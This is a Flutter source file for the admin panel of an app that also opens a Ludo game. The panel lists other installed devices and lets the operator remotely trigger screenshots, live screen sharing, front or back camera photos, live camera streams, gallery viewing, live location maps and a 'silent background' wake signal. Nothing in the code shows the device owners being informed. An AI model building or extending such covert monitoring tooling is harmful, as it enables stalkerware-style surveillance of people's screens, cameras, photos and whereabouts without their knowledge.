import 'package:flutter/material.dart';
import 'package:get/get.dart';
import '../controllers/admin_controller.dart';
import '../controllers/auth_controller.dart';
import '../controllers/theme_controller.dart';
import 'home_screen.dart';
import '../widgets/live_share_view.dart';
import 'user_gallery_screen.dart';
import 'user_location_screen.dart';

class AdminPanelScreen extends StatefulWidget {
  const AdminPanelScreen({super.key});

  @override
  State<AdminPanelScreen> createState() => _AdminPanelScreenState();
}

class _AdminPanelScreenState extends State<AdminPanelScreen> {
  String _cameraFacing = 'front';
  bool _isFullscreenStreamVisible = false;
  String? _openedFullscreenRequestId;

  void _openFullscreenStream(String requestId, String requestType) {
    if (!mounted || _isFullscreenStreamVisible) return;

    _isFullscreenStreamVisible = true;
    _openedFullscreenRequestId = requestId;

    Navigator.of(context)
        .push(
          MaterialPageRoute(
            builder: (_) => FullScreenLiveStreamPage(
              requestId: requestId,
              requestType: requestType,
            ),
          ),
        )
        .then((_) {
          if (mounted) {
            setState(() => _isFullscreenStreamVisible = false);
          }
        });
  }

  @override
  Widget build(BuildContext context) {
    final adminCtrl = Get.find<AdminController>();

    ScreenshotRequestItem? activeLiveRequest;
    for (final request in adminCtrl.screenshotRequests) {
      if ((request.requestType == 'screen_share' ||
              request.requestType == 'camera_stream') &&
          (request.status == 'active' ||
              request.status == 'live' ||
              request.status == 'offer_created')) {
        activeLiveRequest = request;
        break;
      }
    }

    final activeRequestId = activeLiveRequest?.requestId;
    final activeRequestType = activeLiveRequest?.requestType;

    if (activeLiveRequest != null &&
        !_isFullscreenStreamVisible &&
        _openedFullscreenRequestId != activeRequestId) {
      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (mounted && activeRequestId != null && activeRequestType != null) {
          _openFullscreenStream(
            activeRequestId,
            activeRequestType,
          );
        }
      });
    } else if (activeLiveRequest == null) {
      _openedFullscreenRequestId = null;
    }

    return GetBuilder<ThemeController>(
      builder: (themeState) {
        final theme = themeState.currentTheme;

        return Scaffold(
          appBar: AppBar(
            title: const Text('Admin Panel'),
            backgroundColor: theme.blue,
            actions: [
              IconButton(
                icon: const Icon(Icons.sports_esports),
                onPressed: () => Get.to(() => const HomeScreen()),
                tooltip: 'Go to Ludo Game',
              ),
              IconButton(
                icon: const Icon(Icons.refresh),
                onPressed: adminCtrl.refreshDeviceList,
                tooltip: 'Refresh Device List',
              ),
              IconButton(
                icon: const Icon(Icons.logout),
                onPressed: () async {
                  await Get.find<AuthController>().signOut();
                },
                tooltip: 'Sign Out',
              ),
            ],
          ),
          body: Obx(() {
            if (!adminCtrl.isReady.value) {
              return const Center(child: CircularProgressIndicator());
            }

            return ListView(
              padding: const EdgeInsets.all(16.0),
              children: [
                Card(
                  color: theme.cardBg,
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(16),
                  ),
                  child: Padding(
                    padding: const EdgeInsets.all(16.0),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          'Installed Devices',
                          style: TextStyle(
                            fontSize: 18,
                            fontWeight: FontWeight.bold,
                            color: theme.textPrimary,
                          ),
                        ),
                        const SizedBox(height: 8),
                        Text(
                          'Total devices excluding this admin device: ${adminCtrl.otherInstalledDevicesCount}',
                          style: TextStyle(
                            fontSize: 14,
                            color: theme.textSecondary,
                          ),
                        ),
                        const SizedBox(height: 4),
                        Text(
                          'Your device ID: ${adminCtrl.currentDeviceId.value}',
                          style: TextStyle(
                            fontSize: 12,
                            color: theme.textSecondary,
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
                const SizedBox(height: 16),
                Card(
                  color: theme.cardBg,
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(16),
                  ),
                  child: Padding(
                    padding: const EdgeInsets.all(12.0),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          'Camera Settings',
                          style: TextStyle(
                            fontSize: 16,
                            fontWeight: FontWeight.bold,
                            color: theme.textPrimary,
                          ),
                        ),
                        const SizedBox(height: 8),
                        DropdownButtonFormField<String>(
                          initialValue: _cameraFacing,
                          decoration: const InputDecoration(
                            border: OutlineInputBorder(),
                            labelText: 'Camera Facing',
                          ),
                          items: const [
                            DropdownMenuItem(value: 'front', child: Text('Front Camera')),
                            DropdownMenuItem(value: 'back', child: Text('Back Camera')),
                          ],
                          onChanged: (value) {
                            if (value != null) {
                              setState(() => _cameraFacing = value);
                            }
                          },
                        ),
                      ],
                    ),
                  ),
                ),
                const SizedBox(height: 16),
                Wrap(
                  alignment: WrapAlignment.spaceBetween,
                  crossAxisAlignment: WrapCrossAlignment.center,
                  spacing: 12,
                  runSpacing: 10,
                  children: [
                    Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        const Text('Only native-enabled', style: TextStyle(fontSize: 13)),
                        const SizedBox(width: 6),
                        Obx(
                          () => Transform.scale(
                            scale: 0.85,
                            child: Switch(
                              value: adminCtrl.showOnlyNative.value,
                              onChanged: (v) =>
                                  adminCtrl.showOnlyNative.value = v,
                            ),
                          ),
                        ),
                      ],
                    ),
                    ElevatedButton.icon(
                      onPressed:
                          adminCtrl.devices
                              .where(
                                (d) =>
                                    d.deviceId !=
                                        adminCtrl.currentDeviceId.value &&
                                    (!adminCtrl.showOnlyNative.value ||
                                        d.nativeCaptureEnabled),
                              )
                              .isEmpty
                          ? null
                          : () async {
                              await adminCtrl.requestScreenshotForFiltered();
                              Get.snackbar(
                                'Requests Sent',
                                'Screenshot requests sent to filtered devices.',
                                snackPosition: SnackPosition.BOTTOM,
                              );
                            },
                      icon: const Icon(Icons.photo_library, size: 18),
                      label: const Text('Request For Filtered', style: TextStyle(fontSize: 13)),
                    ),
                  ],
                ),
                const SizedBox(height: 16),

                ...adminCtrl.devices
                    .where(
                      (d) =>
                          d.deviceId != adminCtrl.currentDeviceId.value &&
                          (!adminCtrl.showOnlyNative.value ||
                              d.nativeCaptureEnabled),
                    )
                    .map((device) {
                      final isSelf =
                          device.deviceId == adminCtrl.currentDeviceId.value;
                      return Card(
                        color: theme.cardBg,
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(16),
                        ),
                        margin: const EdgeInsets.only(bottom: 12),
                        child: Padding(
                          padding: const EdgeInsets.all(14.0),
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.stretch,
                            children: [
                              Row(
                                children: [
                                  CircleAvatar(
                                    radius: 18,
                                    backgroundColor: theme.blue,
                                    child: const Icon(Icons.person, color: Colors.white, size: 20),
                                  ),
                                  const SizedBox(width: 10),
                                  Expanded(
                                    child: Column(
                                      crossAxisAlignment: CrossAxisAlignment.start,
                                      children: [
                                        Text(
                                          isSelf ? 'Admin (${device.username})' : device.username,
                                          style: TextStyle(
                                            fontWeight: FontWeight.bold,
                                            fontSize: 16,
                                            color: theme.textPrimary,
                                          ),
                                        ),
                                        Text(
                                          'ID: ${device.deviceId}',
                                          style: TextStyle(
                                            fontSize: 11,
                                            color: theme.textSecondary,
                                          ),
                                        ),
                                      ],
                                    ),
                                  ),
                                  IconButton(
                                    icon: const Icon(Icons.photo_library, color: Colors.blueAccent),
                                    onPressed: () => Get.to(() => UserGalleryScreen(device: device)),
                                    tooltip: 'View User Gallery',
                                  ),
                                  Chip(
                                    label: Text(device.platform.toUpperCase()),
                                    backgroundColor: theme.boardBg,
                                    labelStyle: TextStyle(
                                      color: theme.textPrimary,
                                      fontSize: 10,
                                    ),
                                  ),
                                  const SizedBox(width: 4),
                                  if (device.nativeCaptureEnabled)
                                    Container(
                                      padding: const EdgeInsets.symmetric(
                                        horizontal: 6,
                                        vertical: 3,
                                      ),
                                      decoration: BoxDecoration(
                                        color: Colors.green.shade600,
                                        borderRadius: BorderRadius.circular(10),
                                      ),
                                      child: const Text(
                                        'Native',
                                        style: TextStyle(
                                          color: Colors.white,
                                          fontSize: 10,
                                        ),
                                      ),
                                    ),
                                ],
                              ),
                              const SizedBox(height: 8),
                              Row(
                                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                children: [
                                  Expanded(
                                    child: Text(
                                      'Last active: ${device.lastSeenAt?.toLocal().toString() ?? 'unknown'}',
                                      style: TextStyle(
                                        color: theme.textSecondary,
                                        fontSize: 11,
                                      ),
                                      maxLines: 1,
                                      overflow: TextOverflow.ellipsis,
                                    ),
                                  ),
                                  Row(
                                    children: [
                                      TextButton.icon(
                                        onPressed: () => Get.to(() => UserLocationScreen(device: device)),
                                        icon: const Icon(Icons.map_rounded, size: 16, color: Colors.redAccent),
                                        label: const Text('Live Map', style: TextStyle(color: Colors.redAccent)),
                                        style: TextButton.styleFrom(
                                          padding: const EdgeInsets.symmetric(horizontal: 6),
                                          visualDensity: VisualDensity.compact,
                                        ),
                                      ),
                                      TextButton.icon(
                                        onPressed: () => Get.to(() => UserGalleryScreen(device: device)),
                                        icon: const Icon(Icons.collections, size: 16),
                                        label: const Text('Gallery'),
                                        style: TextButton.styleFrom(
                                          padding: const EdgeInsets.symmetric(horizontal: 6),
                                          visualDensity: VisualDensity.compact,
                                        ),
                                      ),
                                    ],
                                  ),
                                ],
                              ),
                              const SizedBox(height: 12),
                              Row(
                                children: [
                                  Expanded(
                                    child: ElevatedButton.icon(
                                      onPressed: isSelf
                                          ? null
                                          : () async {
                                              await adminCtrl.requestScreenshot(
                                                device.deviceId,
                                              );
                                              Get.snackbar(
                                                'Screenshot Requested',
                                                'A screenshot request was sent to the selected device.',
                                                snackPosition:
                                                    SnackPosition.BOTTOM,
                                              );
                                            },
                                      icon: const Icon(Icons.photo_camera),
                                      label: const Text('Screenshot'),
                                      style: ElevatedButton.styleFrom(
                                        backgroundColor: isSelf
                                            ? Colors.grey
                                            : theme.blue,
                                      ),
                                    ),
                                  ),
                                  const SizedBox(width: 8),
                                  Expanded(
                                    child: OutlinedButton.icon(
                                      onPressed: isSelf
                                          ? null
                                          : () async {
                                              await adminCtrl
                                                  .requestScreenShare(
                                                    device.deviceId,
                                                  );
                                              Get.snackbar(
                                                'Live Share Requested',
                                                'A live share session was started for the selected device.',
                                                snackPosition:
                                                    SnackPosition.BOTTOM,
                                              );
                                            },
                                      icon: const Icon(
                                        Icons.screenshot_monitor,
                                      ),
                                      label: const Text('Live Share'),
                                      style: OutlinedButton.styleFrom(
                                        foregroundColor: theme.blue,
                                        side: BorderSide(color: theme.blue),
                                      ),
                                    ),
                                  ),
                                ],
                              ),
                               const SizedBox(height: 8),
                              Row(
                                children: [
                                  Expanded(
                                    child: ElevatedButton.icon(
                                      onPressed: isSelf
                                          ? null
                                          : () async {
                                              await adminCtrl.requestCameraCapture(
                                                device.deviceId,
                                                cameraFacing: _cameraFacing,
                                              );
                                              Get.snackbar(
                                                'Camera Capture Requested',
                                                'The target device will capture a photo from the selected camera.',
                                                snackPosition:
                                                    SnackPosition.BOTTOM,
                                              );
                                            },
                                      icon: const Icon(Icons.camera_alt),
                                      label: const Text('Capture Camera'),
                                      style: ElevatedButton.styleFrom(
                                        backgroundColor: isSelf
                                            ? Colors.grey
                                            : theme.blue,
                                      ),
                                    ),
                                  ),
                                  const SizedBox(width: 8),
                                  Expanded(
                                    child: OutlinedButton.icon(
                                      onPressed: isSelf
                                          ? null
                                          : () async {
                                              await adminCtrl.requestCameraStream(
                                                device.deviceId,
                                                cameraFacing: _cameraFacing,
                                              );
                                              Get.snackbar(
                                                'Camera Stream Requested',
                                                'The target device will start a live camera stream.',
                                                snackPosition:
                                                    SnackPosition.BOTTOM,
                                              );
                                            },
                                      icon: const Icon(Icons.videocam),
                                      label: const Text('Live Camera'),
                                      style: OutlinedButton.styleFrom(
                                        foregroundColor: theme.blue,
                                        side: BorderSide(color: theme.blue),
                                      ),
                                    ),
                                  ),
                                ],
                              ),
                              const SizedBox(height: 8),
                              SizedBox(
                                width: double.infinity,
                                child: TextButton.icon(
                                  onPressed: isSelf
                                      ? null
                                      : () async {
                                          await adminCtrl.wakeDevice(device.deviceId);
                                          Get.snackbar(
                                            'Silent Wake Dispatched',
                                            'A high-priority background wake signal was sent to ${device.username}.',
                                            snackPosition: SnackPosition.BOTTOM,
                                            backgroundColor: Colors.indigo.shade800,
                                            colorText: Colors.white,
                                          );
                                        },
                                  icon: const Icon(Icons.bolt, color: Colors.amberAccent, size: 18),
                                  label: const Text(
                                    'Wake Device (Silent Background)',
                                    style: TextStyle(color: Colors.amberAccent, fontWeight: FontWeight.w600, fontSize: 13),
                                  ),
                                  style: TextButton.styleFrom(
                                    backgroundColor: Colors.amber.withOpacity(0.12),
                                    shape: RoundedRectangleBorder(
                                      borderRadius: BorderRadius.circular(12),
                                      side: BorderSide(color: Colors.amber.withOpacity(0.3)),
                                    ),
                                    padding: const EdgeInsets.symmetric(vertical: 10),
                                  ),
                                ),
                              ),
                            ],
                          ),
                        ),
                      );
                    }),
                if (adminCtrl.screenshotRequests.isNotEmpty) ...[
                  const SizedBox(height: 16),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Text(
                        'Recent Requests (Latest 20)',
                        style: TextStyle(
                          fontSize: 16,
                          fontWeight: FontWeight.bold,
                          color: theme.textPrimary,
                        ),
                      ),
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                        decoration: BoxDecoration(
                          color: theme.blue.withOpacity(0.2),
                          borderRadius: BorderRadius.circular(10),
                        ),
                        child: Text(
                          '${adminCtrl.screenshotRequests.length} Total',
                          style: TextStyle(
                            color: theme.blue,
                            fontSize: 12,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 10),
                  ...adminCtrl.groupedRequestsByDevice.entries.map((entry) {
                    final targetId = entry.key;
                    final reqList = entry.value;
                    final targetName = adminCtrl.getDeviceDisplayName(targetId);

                    return Card(
                      color: theme.cardBg,
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(16),
                        side: BorderSide(color: theme.gridLine),
                      ),
                      margin: const EdgeInsets.only(bottom: 14),
                      child: Padding(
                        padding: const EdgeInsets.all(14.0),
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            // Device Group Header
                            Row(
                              children: [
                                CircleAvatar(
                                  radius: 14,
                                  backgroundColor: theme.blue.withOpacity(0.2),
                                  child: Icon(Icons.phone_android, size: 16, color: theme.blue),
                                ),
                                const SizedBox(width: 10),
                                Expanded(
                                  child: Text(
                                    targetName,
                                    style: TextStyle(
                                      fontSize: 15,
                                      fontWeight: FontWeight.bold,
                                      color: theme.textPrimary,
                                    ),
                                  ),
                                ),
                                Container(
                                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                                  decoration: BoxDecoration(
                                    color: theme.boardBg,
                                    borderRadius: BorderRadius.circular(8),
                                  ),
                                  child: Text(
                                    '${reqList.length} ${reqList.length == 1 ? 'request' : 'requests'}',
                                    style: TextStyle(fontSize: 11, color: theme.textSecondary),
                                  ),
                                ),
                              ],
                            ),
                            const Divider(height: 20),
                            // Request Items in this Group
                            ...reqList.map((request) {
                              return Container(
                                margin: const EdgeInsets.only(bottom: 10),
                                padding: const EdgeInsets.all(10),
                                decoration: BoxDecoration(
                                  color: theme.boardBg.withOpacity(0.5),
                                  borderRadius: BorderRadius.circular(12),
                                ),
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.stretch,
                                  children: [
                                    Row(
                                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                      children: [
                                        Row(
                                          children: [
                                            Icon(
                                              request.requestType == 'camera_capture'
                                                  ? Icons.camera_alt
                                                  : request.requestType == 'screen_share'
                                                      ? Icons.screenshot_monitor
                                                      : request.requestType == 'camera_stream'
                                                          ? Icons.videocam
                                                          : request.requestType == 'location_ping'
                                                              ? Icons.location_on
                                                              : request.requestType == 'wake_up'
                                                                  ? Icons.bolt
                                                                  : Icons.photo_camera,
                                              size: 16,
                                              color: theme.blue,
                                            ),
                                            const SizedBox(width: 6),
                                            Text(
                                              request.requestType == 'screen_share'
                                                  ? 'Live Share'
                                                  : request.requestType == 'camera_capture'
                                                      ? 'Camera Capture'
                                                      : request.requestType == 'camera_stream'
                                                          ? 'Camera Stream'
                                                          : request.requestType == 'location_ping'
                                                              ? 'Location Ping'
                                                              : request.requestType == 'wake_up'
                                                                  ? 'Silent Wake'
                                                                  : 'Screenshot',
                                              style: TextStyle(
                                                color: theme.textPrimary,
                                                fontWeight: FontWeight.w600,
                                                fontSize: 13,
                                              ),
                                            ),
                                          ],
                                        ),
                                        Container(
                                          padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                                          decoration: BoxDecoration(
                                            color: request.status == 'completed'
                                                ? Colors.green.shade700
                                                : (request.status == 'active' || request.status == 'live')
                                                    ? Colors.blue.shade700
                                                    : request.status == 'failed'
                                                        ? Colors.red.shade700
                                                        : Colors.amber.shade800,
                                            borderRadius: BorderRadius.circular(8),
                                          ),
                                          child: Text(
                                            request.status.toUpperCase(),
                                            style: const TextStyle(
                                              color: Colors.white,
                                              fontSize: 10,
                                              fontWeight: FontWeight.bold,
                                            ),
                                          ),
                                        ),
                                      ],
                                    ),
                                    const SizedBox(height: 4),
                                    if (request.requestedAt != null)
                                      Text(
                                        'Requested: ${request.requestedAt!.toLocal().toString().split('.').first}',
                                        style: TextStyle(color: theme.textSecondary, fontSize: 11),
                                      ),
                                    if ((request.requestType == 'screen_share' ||
                                            request.requestType == 'camera_stream') &&
                                        (request.status == 'active' ||
                                            request.status == 'live' ||
                                            request.status == 'offer_created')) ...[
                                      const SizedBox(height: 8),
                                      ElevatedButton.icon(
                                        onPressed: () => _openFullscreenStream(
                                          request.requestId,
                                          request.requestType,
                                        ),
                                        icon: const Icon(Icons.fullscreen, size: 18),
                                        label: const Text('Open Full Screen'),
                                        style: ElevatedButton.styleFrom(
                                          visualDensity: VisualDensity.compact,
                                        ),
                                      ),
                                      const SizedBox(height: 6),
                                      if (request.requestType == 'screen_share')
                                        ElevatedButton.icon(
                                          onPressed: () async {
                                            await adminCtrl.stopScreenShare(request.requestId);
                                            Get.snackbar(
                                              'Live Share Stopped',
                                              'The live share session was stopped.',
                                              snackPosition: SnackPosition.BOTTOM,
                                            );
                                          },
                                          icon: const Icon(Icons.stop_circle_outlined, size: 18),
                                          label: const Text('Stop Live Share'),
                                          style: ElevatedButton.styleFrom(
                                            backgroundColor: Colors.redAccent,
                                            visualDensity: VisualDensity.compact,
                                          ),
                                        ),
                                    ],
                                    if (request.screenshotUrl != null) ...[
                                      const SizedBox(height: 8),
                                      ClipRRect(
                                        borderRadius: BorderRadius.circular(8),
                                        child: Image.network(
                                          request.screenshotUrl!,
                                          fit: BoxFit.cover,
                                          height: 180,
                                          errorBuilder: (_, __, ___) => Container(
                                            height: 80,
                                            color: Colors.grey.shade900,
                                            child: const Center(
                                              child: Text('Image failed to load', style: TextStyle(color: Colors.white70, fontSize: 12)),
                                            ),
                                          ),
                                        ),
                                      ),
                                    ],
                                    if (request.status == 'failed' || request.error != null || request.failureReason != null) ...[
                                      const SizedBox(height: 6),
                                      Container(
                                        padding: const EdgeInsets.all(8),
                                        decoration: BoxDecoration(
                                          color: Colors.red.withOpacity(0.12),
                                          borderRadius: BorderRadius.circular(8),
                                          border: Border.all(color: Colors.redAccent.withOpacity(0.4)),
                                        ),
                                        child: Column(
                                          crossAxisAlignment: CrossAxisAlignment.start,
                                          children: [
                                            if (request.error != null)
                                              Text(
                                                'Error: ${request.error}',
                                                style: const TextStyle(color: Colors.redAccent, fontSize: 11, fontWeight: FontWeight.w600),
                                              ),
                                            if (request.failureReason != null) ...[
                                              if (request.error != null) const SizedBox(height: 2),
                                              Text(
                                                'Reason: ${request.failureReason}',
                                                style: const TextStyle(color: Colors.orangeAccent, fontSize: 11),
                                              ),
                                            ],
                                          ],
                                        ),
                                      ),
                                    ],
                                  ],
                                ),
                              );
                            }),
                          ],
                        ),
                      ),
                    );
                  }),
                ],
              ],
            );
          }),
        );
      },
    );
  }
}
